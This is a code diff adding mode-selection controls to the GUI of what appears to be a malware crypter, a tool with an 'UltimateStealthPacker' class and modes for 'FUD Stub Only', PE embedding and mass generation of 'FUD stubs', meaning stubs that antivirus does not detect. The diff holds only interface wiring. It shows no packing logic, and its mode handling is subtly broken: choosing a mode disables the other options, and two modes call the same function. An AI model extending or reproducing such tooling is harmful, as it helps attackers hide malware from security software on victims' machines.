@@ -55,10 +55,18 @@
 #define ID_MASS_GENERATE_BUTTON 1012
 #define ID_MASS_COUNT_EDIT 1013
 #define ID_STOP_GENERATION_BUTTON 1014
+// Add new control IDs for mode selection
+#define ID_MODE_STUB_RADIO 1015
+#define ID_MODE_PACK_RADIO 1016
+#define ID_MODE_MASS_RADIO 1017
+#define ID_MODE_GROUP 1018
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
 HANDLE g_massGenerationThread = NULL;
+
+// Global variables for mode selection
+int g_currentMode = 1; // 1=Stub Only, 2=PE Packing, 3=Mass Generation
 
 class AdvancedRandomEngine {
 public:
@@ -1300,7 +1308,8 @@ private:
 
 // Global variables
 HWND g_hInputPath, g_hOutputPath, g_hProgressBar, g_hStatusText, g_hCompanyCombo, g_hArchCombo, g_hCertCombo;
-HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn;
+HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn, g_hCreateButton;
+HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
 UltimateStealthPacker g_packer;
 
 // Mass generation function
@@ -1570,6 +1579,25 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             g_hStopGenerationBtn = CreateWindowW(L"BUTTON", L"Stop Generation", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                                 310, 307, 100, 25, hwnd, (HMENU)ID_STOP_GENERATION_BUTTON, NULL, NULL);
             
+            // Mode selection radio buttons
+            CreateWindowW(L"STATIC", L"Packing Mode:", WS_VISIBLE | WS_CHILD,
+                         10, 350, 120, 20, hwnd, NULL, NULL, NULL);
+            
+            g_hModeGroup = CreateWindowW(L"BUTTON", L"", WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
+                                        140, 345, 300, 100, hwnd, (HMENU)ID_MODE_GROUP, NULL, NULL);
+            
+            g_hModeStubRadio = CreateWindowW(L"BUTTON", L"FUD Stub Only", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
+                                             150, 360, 120, 25, hwnd, (HMENU)ID_MODE_STUB_RADIO, NULL, NULL);
+            SendMessageW(g_hModeStubRadio, BM_SETCHECK, BST_CHECKED, 0);
+            
+            g_hModePackRadio = CreateWindowW(L"BUTTON", L"PE Embedding/Packing", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
+                                             150, 390, 120, 25, hwnd, (HMENU)ID_MODE_PACK_RADIO, NULL, NULL);
+            SendMessageW(g_hModePackRadio, BM_SETCHECK, BST_UNCHECKED, 0);
+            
+            g_hModeMassRadio = CreateWindowW(L"BUTTON", L"Mass Generation", WS_VISIBLE | WS_CHILD | BS_AUTORADIOBUTTON,
+                                             150, 420, 120, 25, hwnd, (HMENU)ID_MODE_MASS_RADIO, NULL, NULL);
+            SendMessageW(g_hModeMassRadio, BM_SETCHECK, BST_UNCHECKED, 0);
+            
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
             break;
@@ -1608,7 +1636,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 }
                 
                 case ID_CREATE_BUTTON: {
-                    std::thread(createBenignExecutable).detach();
+                    if (g_currentMode == 1) { // FUD Stub Only
+                        std::thread(createBenignExecutable).detach();
+                    } else if (g_currentMode == 2) { // PE Embedding/Packing
+                        std::thread(createBenignExecutable).detach();
+                    } else if (g_currentMode == 3) { // Mass Generation
+                        startMassGeneration();
+                    }
                     break;
                 }
                 
@@ -1633,12 +1667,61 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 }
 
                 case ID_MASS_GENERATE_BUTTON: {
-                    startMassGeneration();
+                    if (g_currentMode == 3) { // Mass Generation
+                        startMassGeneration();
+                    }
                     break;
                 }
 
                 case ID_STOP_GENERATION_BUTTON: {
-                    stopMassGeneration();
+                    if (g_currentMode == 3) { // Mass Generation
+                        stopMassGeneration();
+                    }
+                    break;
+                }
+
+                case ID_MODE_STUB_RADIO: {
+                    if (HIWORD(wParam) == BN_CLICKED) {
+                        g_currentMode = 1;
+                        EnableWindow(g_hModePackRadio, FALSE);
+                        EnableWindow(g_hModeMassRadio, FALSE);
+                        EnableWindow(g_hCreateButton, TRUE);
+                        EnableWindow(g_hMassCountEdit, FALSE);
+                        EnableWindow(g_hMassGenerateBtn, FALSE);
+                        EnableWindow(g_hStopGenerationBtn, FALSE);
+                        SetWindowTextW(g_hStatusText, L"Ready to create a FUD stub executable.");
+                        SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
+                    }
+                    break;
+                }
+
+                case ID_MODE_PACK_RADIO: {
+                    if (HIWORD(wParam) == BN_CLICKED) {
+                        g_currentMode = 2;
+                        EnableWindow(g_hModeStubRadio, FALSE);
+                        EnableWindow(g_hModeMassRadio, FALSE);
+                        EnableWindow(g_hCreateButton, TRUE);
+                        EnableWindow(g_hMassCountEdit, FALSE);
+                        EnableWindow(g_hMassGenerateBtn, FALSE);
+                        EnableWindow(g_hStopGenerationBtn, FALSE);
+                        SetWindowTextW(g_hStatusText, L"Ready to create a PE-embedded executable.");
+                        SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
+                    }
+                    break;
+                }
+
+                case ID_MODE_MASS_RADIO: {
+                    if (HIWORD(wParam) == BN_CLICKED) {
+                        g_currentMode = 3;
+                        EnableWindow(g_hModeStubRadio, FALSE);
+                        EnableWindow(g_hModePackRadio, FALSE);
+                        EnableWindow(g_hCreateButton, FALSE); // Disable create button in mass generation mode
+                        EnableWindow(g_hMassCountEdit, TRUE);
+                        EnableWindow(g_hMassGenerateBtn, TRUE);
+                        EnableWindow(g_hStopGenerationBtn, TRUE);
+                        SetWindowTextW(g_hStatusText, L"Ready to start mass generation of FUD stubs.");
+                        SendMessage(g_hProgressBar, PBM_SETPOS, 0, 0);
+                    }
                     break;
                 }
             }
